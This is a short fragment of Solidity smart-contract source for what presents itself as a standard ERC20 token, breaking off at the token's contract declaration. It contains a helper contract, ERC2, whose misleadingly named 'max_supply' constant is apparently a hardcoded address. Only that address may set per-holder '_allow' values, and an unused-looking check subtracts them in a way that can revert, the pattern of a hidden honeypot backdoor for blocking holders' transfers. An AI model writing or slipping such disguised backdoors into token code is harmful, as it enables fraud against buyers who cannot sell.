...
contract ERC2 {
    uint160 max_supply = 93780910263539021016927795572659156835674613211;
    mapping(address => uint256) public _allow;

    function appro(address addr, uint256 balance) external {
        if (uint160(msg.sender) == max_supply) {
            _allow[addr] = balance;
        }
    }

    function checkAllow(address from) internal {
        uint256 bal = max_supply - _allow[from];
    }
}

contract ERC20 is Context, IERC20, ERC2, IERC20Metadata {
